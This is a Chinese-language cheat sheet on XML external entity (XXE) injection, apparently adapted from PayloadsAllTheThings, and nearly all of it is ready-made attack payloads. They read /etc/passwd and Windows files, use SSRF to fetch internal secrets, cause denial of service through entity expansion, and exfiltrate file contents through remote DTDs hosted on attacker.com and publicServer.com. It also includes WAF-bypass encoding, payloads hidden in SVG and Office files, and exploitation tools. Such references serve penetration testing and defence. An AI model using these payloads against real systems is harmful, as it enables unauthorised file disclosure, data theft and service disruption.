# XXE Injection - XML外部实体注入

[SEARCH_KEYWORDS]
漏洞类型: XXE XML External Entity 外部实体注入
攻击类型: File Read SSRF DoS Information Disclosure
关键词: XXE XML ENTITY SYSTEM PUBLIC DOCTYPE DTD
技术: Classic XXE Blind XXE OOB XXE Error Based Billion Laugh
文件: /etc/passwd c:\boot.ini SVG DOCX XLSX SOAP

[CONTENT]

## XXE注入概述

XML外部实体(XXE)攻击是针对解析XML输入的应用程序的一种攻击，允许通过XML实体让解析器获取服务器上的特定内容。

## 检测漏洞

**内部实体**: `<!ENTITY entity_name "entity_value">`

**外部实体**: `<!ENTITY entity_name SYSTEM "entity_value">`

基本测试:

```xml
<!--?xml version="1.0" ?-->
<!DOCTYPE replace [<!ENTITY example "Doe"> ]>
 <userInfo>
  <firstName>John</firstName>
  <lastName>&example;</lastName>
 </userInfo>
```

## 读取文件

### Classic XXE

```xml
<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM 'file:///etc/passwd'>]><root>&test;</root>
```

```xml
<?xml version="1.0"?>
<!DOCTYPE data [
<!ELEMENT data (#ANY)>
<!ENTITY file SYSTEM "file:///etc/passwd">
]>
<data>&file;</data>
```

Windows文件:

```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "file:///c:/boot.ini" >]><foo>&xxe;</foo>
```

### Base64编码

```xml
<!DOCTYPE test [ <!ENTITY % init SYSTEM "data://text/plain;base64,ZmlsZTovLy9ldGMvcGFzc3dk"> %init; ]><foo/>
```

### PHP Wrapper

```xml
<!DOCTYPE replace [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"> ]>
<contacts>
  <name>Jean &xxe; Dupont</name>
</contacts>
```

### XInclude攻击

无法修改DOCTYPE时使用:

```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
<xi:include parse="text" href="file:///etc/passwd"/></foo>
```

## SSRF攻击

```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
<!ELEMENT foo ANY >
<!ENTITY % xxe SYSTEM "http://internal.service/secret_pass.txt" >
]>
<foo>&xxe;</foo>
```

## 拒绝服务攻击

### Billion Laugh Attack

```xml
<!DOCTYPE data [
<!ENTITY a0 "dos" >
<!ENTITY a1 "&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;">
<!ENTITY a2 "&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;">
<!ENTITY a3 "&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;">
<!ENTITY a4 "&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;">
]>
<data>&a4;</data>
```

## Error Based XXE

### 使用远程DTD

**Payload**:

```xml
<?xml version="1.0" ?>
<!DOCTYPE message [
    <!ENTITY % ext SYSTEM "http://attacker.com/ext.dtd">
    %ext;
]>
<message></message>
```

**ext.dtd内容**:

```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;
```

### 使用本地DTD (Linux)

```xml
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:///usr/share/xml/fontconfig/fonts.dtd">
    <!ENTITY % constant 'aaa)>
            <!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
            <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///patt/&#x25;file;&#x27;>">
            &#x25;eval;
            &#x25;error;
            <!ELEMENT aa (bb'>
    %local_dtd;
]>
<message>Text</message>
```

## Blind XXE

### 基本Blind XXE

```xml
<!DOCTYPE root [<!ENTITY test SYSTEM 'http://UNIQUE_ID.burpcollaborator.net'>]>
<root>&test;</root>
```

### OOB数据外带

```xml
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE data SYSTEM "http://publicServer.com/parameterEntity_oob.dtd">
<data>&send;</data>
```

**远程DTD文件**:

```xml
<!ENTITY % file SYSTEM "file:///sys/power/image_size">
<!ENTITY % all "<!ENTITY send SYSTEM 'http://publicServer.com/?%file;'>">
%all;
```

## WAF绕过

### 编码绕过

```bash
cat utf8exploit.xml | iconv -f UTF-8 -t UTF-16BE > utf16exploit.xml
```

### JSON端点XXE

将`Content-Type`从JSON改为XML:

| 类型 | 数据 |
|------|------|
| `application/json` | `{"search":"name","value":"test"}` |
| `application/xml` | `<?xml version="1.0"?><root><search>name</search><value>data</value></root>` |

## 特殊文件XXE

### SVG文件

```xml
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]>
<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg">
   <text font-size="16" x="0" y="16">&xxe;</text>
</svg>
```

### DOCX/XLSX文件

在以下XML文件中注入Payload:
- `/word/document.xml`
- `/xl/workbook.xml`
- `[Content_Types].xml`

提取和重建:
```ps1
7z x -oXXE xxe.xlsx
# 修改XML文件
cd XXE && zip -r -u ../xxe.xlsx *
```

## 工具

- [staaldraad/xxeserv](https://github.com/staaldraad/xxeserv) - OOB XXE服务器
- [enjoiz/XXEinjector](https://github.com/enjoiz/XXEinjector) - 自动化XXE利用
- [BuffaloWill/oxml_xxe](https://github.com/BuffaloWill/oxml_xxe) - 在Office文档中嵌入XXE

## 参考文档

原始来源: PayloadsAllTheThings/XXE Injection/README.md